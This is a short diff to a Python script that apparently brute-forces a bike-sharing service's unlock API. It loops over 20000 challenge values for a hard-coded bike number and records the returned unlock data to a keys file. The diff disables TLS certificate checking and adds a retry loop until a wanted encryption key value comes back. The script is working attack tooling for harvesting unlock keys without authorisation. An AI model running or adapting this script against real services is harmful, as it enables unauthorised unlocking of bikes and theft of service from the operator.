@@ -4,14 +4,17 @@ import hexdump
 import struct
 import sys
 
-f = open('keys_b1.txt', 'w+')
+f = open('keys_cb_1.txt', 'w+')
 
-bikeno = '049004105'
-h = HttpClient()
+bikeno = '041007051'
+h = HttpClient(verify=False)
 for i in range(0, 20000):
     challenge = struct.pack('<I', i).encode('hex')
     try:
-        res = h.unlock_pass(bikeno, challenge)['data']
+        while True:
+            res = h.unlock_pass(bikeno, challenge)['data']
+            if res['encryptionKey'] >= 168:
+                break
     except:
         continue
     try:
